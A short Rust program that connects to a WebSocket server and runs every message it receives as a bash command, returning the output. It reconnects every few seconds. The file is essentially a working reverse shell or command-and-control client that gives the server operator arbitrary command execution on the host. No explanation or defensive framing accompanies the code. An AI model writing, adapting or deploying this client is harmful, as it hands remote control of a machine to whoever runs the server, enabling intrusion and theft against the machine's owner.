extern crate ws;

use ws::{connect, Handler, Sender, Handshake, Result, Message};
use std::process::Command;
use std::{thread, time};

struct Client {
    out: Sender
}

impl Handler for Client {

    fn on_open(&mut self, _: Handshake) -> Result<()> {
        self.out.send("new session started, connected.")
    }

    fn on_message(&mut self, msg: Message) -> Result<()> {
        
        let output =  Command::new("/bin/bash")
               .arg("-c")
               .arg(msg.as_text().unwrap())
               .output()
               .expect("");

        self.out.send(output.stdout)
    }
}

fn main() {
  connect("ws://127.0.0.1:8080", |out| Client { out: out } ).unwrap();
  thread::sleep(time::Duration::from_secs(5));
  main()
}
